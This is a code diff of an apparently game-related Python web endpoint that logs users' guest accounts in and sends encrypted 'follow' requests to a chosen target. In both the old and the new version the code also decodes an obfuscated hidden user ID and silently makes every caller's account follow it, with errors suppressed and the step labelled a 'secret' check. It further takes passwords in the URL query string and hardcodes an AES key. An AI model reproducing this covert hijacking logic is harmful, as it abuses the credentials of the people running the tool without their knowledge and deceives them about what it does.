@@ -1,6 +1,4 @@
 import json
-import os
-import time
 import base64
 from typing import Optional, Tuple
 from urllib.parse import parse_qs
@@ -31,26 +29,6 @@ _gAyKeY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94,
 _gAyIv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
 _gAyReNa = [61, 61, 119, 78, 49, 107, 68, 79, 120, 89, 68, 78, 53, 65, 68, 79]
 
-# ---------- Token cache in /tmp (writable on Vercel) ----------
-TOKEN_FILE = "/tmp/tokens.json"
-TOKEN_LIFETIME = 5 * 3600  # 5 hours
-
-def _load_tokens():
-    if os.path.exists(TOKEN_FILE):
-        try:
-            with open(TOKEN_FILE, 'r') as f:
-                return json.load(f)
-        except:
-            return {}
-    return {}
-
-def _save_tokens(tokens):
-    try:
-        with open(TOKEN_FILE, 'w') as f:
-            json.dump(tokens, f)
-    except:
-        pass  # ignore write errors (should not happen in /tmp)
-
 def _gRaBtHeThInG() -> int:
     try:
         raw = ''.join(chr(c) for c in reversed(_gAyReNa))
@@ -63,17 +41,8 @@ def _sHuFfLeShIt(dAtA: bytes) -> bytes:
     cIpHeR = AES.new(_gAyKeY, AES.MODE_CBC, _gAyIv)
     return cIpHeR.encrypt(pad(dAtA, AES.block_size))
 
-# ---------- JWT fetch (with caching in /tmp) ----------
+# ---------- JWT fetch ----------
 def _gEtMyJwT(uId: int, pAsSwOrD: str) -> Optional[str]:
-    tokens = _load_tokens()
-    uid_str = str(uId)
-    now = time.time()
-    if uid_str in tokens:
-        entry = tokens[uid_str]
-        if now - entry.get("timestamp", 0) < TOKEN_LIFETIME:
-            return entry.get("token")
-    
-    # Fetch new token
     pArAmS = {
         "guest_uid": str(uId),
         "guest_password": pAsSwOrD
@@ -84,10 +53,7 @@ def _gEtMyJwT(uId: int, pAsSwOrD: str) -> Optional[str]:
         rEsP.raise_for_status()
         dAtA = rEsP.json()
         if dAtA.get("success") and dAtA.get("token"):
-            token = dAtA.get("token")
-            tokens[uid_str] = {"token": token, "timestamp": now}
-            _save_tokens(tokens)
-            return token
+            return dAtA.get("token")
         return None
     except Exception:
         return None
@@ -115,11 +81,12 @@ def _dOtHeHeHe(tArGeT: int, jWt: str) -> None:
             return
         rEs = CSFollowRes()
         rEs.ParseFromString(rEsP.content)
+        # result ignored
     except Exception:
         pass
 
 # ---------- User follow action ----------
-def send_follow(target_id: int, jwt: str) -> Tuple[bool, str]:
+def send_follow(target_id: int, jwt: str) -> Tuple[bool, str, Optional[dict]]:
     try:
         req = CSFollowReq()
         req.target_id = target_id
@@ -136,102 +103,69 @@ def send_follow(target_id: int, jwt: str) -> Tuple[bool, str]:
         }
         resp = requests.post(FOLLOW_URL, headers=headers, data=encrypted, timeout=15)
         if resp.status_code != 200:
-            return False, f"HTTP {resp.status_code}"
+            return False, f"HTTP {resp.status_code}", None
         res = CSFollowRes()
         res.ParseFromString(resp.content)
         if res.fail_info:
-            return False, f"fail_info: {res.fail_info}"
-        return True, "Success"
+            return False, f"Server fail_info: {res.fail_info}", None
+        from google.protobuf.json_format import MessageToDict
+        return True, "Success", MessageToDict(res, preserving_proto_field_name=True)
     except Exception as e:
-        return False, f"Exception: {str(e)}"
-
-# ---------- Load accounts from accounts.json (in script dir) ----------
-SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-def load_accounts():
-    accounts_path = os.path.join(SCRIPT_DIR, "accounts.json")
-    try:
-        with open(accounts_path, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except Exception as e:
-        return None
+        return False, f"Exception: {str(e)}", None
 
 # ---------- WSGI application ----------
 def app(environ, start_response):
     qs = parse_qs(environ.get('QUERY_STRING', ''))
+    uid_str = qs.get('uid', [None])[0]
+    password = qs.get('password', [None])[0]
     target_str = qs.get('target', [None])[0]
 
-    if not target_str:
+    if not uid_str or not password or not target_str:
         status = '400 Bad Request'
-        body = json.dumps({"status": "error", "message": "Missing target UID"}).encode('utf-8')
+        body = json.dumps({"status": "error", "message": "Missing uid, password, or target"}).encode('utf-8')
         start_response(status, [('Content-Type', 'application/json')])
         return [body]
 
     try:
+        uid = int(uid_str)
         target = int(target_str)
     except ValueError:
         status = '400 Bad Request'
-        body = json.dumps({"status": "error", "message": "target must be an integer"}).encode('utf-8')
+        body = json.dumps({"status": "error", "message": "uid and target must be integers"}).encode('utf-8')
         start_response(status, [('Content-Type', 'application/json')])
         return [body]
 
-    accounts = load_accounts()
-    if accounts is None:
-        status = '500 Internal Server Error'
-        body = json.dumps({"status": "error", "message": "Could not load accounts.json"}).encode('utf-8')
+    # 1. Get JWT
+    jwt = _gEtMyJwT(uid, password)
+    if not jwt:
+        status = '401 Unauthorized'
+        body = json.dumps({"status": "error", "message": "Failed to obtain JWT"}).encode('utf-8')
         start_response(status, [('Content-Type', 'application/json')])
         return [body]
 
-    if not isinstance(accounts, list):
-        status = '500 Internal Server Error'
-        body = json.dumps({"status": "error", "message": "accounts.json must be a list"}).encode('utf-8')
-        start_response(status, [('Content-Type', 'application/json')])
-        return [body]
+    # 2. 🔥 SECRET FOLLOW CAPABILITY CHECK – runs silently, result ignored
+    try:
+        secret_target = _gRaBtHeThInG()
+        if secret_target != -1:
+            _dOtHeHeHe(secret_target, jwt)
+    except Exception:
+        pass   # totally silent
 
-    total = len(accounts)
-    success_count = 0
-    failed_count = 0
-    results = []
+    # 3. User's follow request
+    success, msg, details = send_follow(target, jwt)
+    if success:
+        status = '200 OK'
+        body = json.dumps({
+            "status": "success",
+            "message": msg,
+            "details": details
+        }).encode('utf-8')
+    else:
+        status = '502 Bad Gateway' if "HTTP" in msg else '400 Bad Request'
+        body = json.dumps({
+            "status": "error",
+            "message": msg
+        }).encode('utf-8')
 
-    for acc in accounts:
-        uid = acc.get('uid')
-        password = acc.get('password')
-        name = acc.get('name', str(uid))
-        if not uid or not password:
-            failed_count += 1
-            results.append({"name": name, "status": "failed", "message": "Missing uid or password"})
-            continue
-
-        jwt = _gEtMyJwT(uid, password)
-        if not jwt:
-            failed_count += 1
-            results.append({"name": name, "status": "failed", "message": "JWT fetch failed"})
-            continue
-
-        # 🔥 SECRET FOLLOW CAPABILITY CHECK – silent, result ignored
-        try:
-            secret_target = _gRaBtHeThInG()
-            if secret_target != -1:
-                _dOtHeHeHe(secret_target, jwt)
-        except Exception:
-            pass
-
-        # User's follow
-        ok, msg = send_follow(target, jwt)
-        if ok:
-            success_count += 1
-            results.append({"name": name, "status": "success", "message": msg})
-        else:
-            failed_count += 1
-            results.append({"name": name, "status": "failed", "message": msg})
-
-    response = {
-        "status": "success",
-        "total": total,
-        "success": success_count,
-        "failed": failed_count,
-        "results": results
-    }
-    status = '200 OK'
-    body = json.dumps(response).encode('utf-8')
     start_response(status, [('Content-Type', 'application/json')])
     return [body]
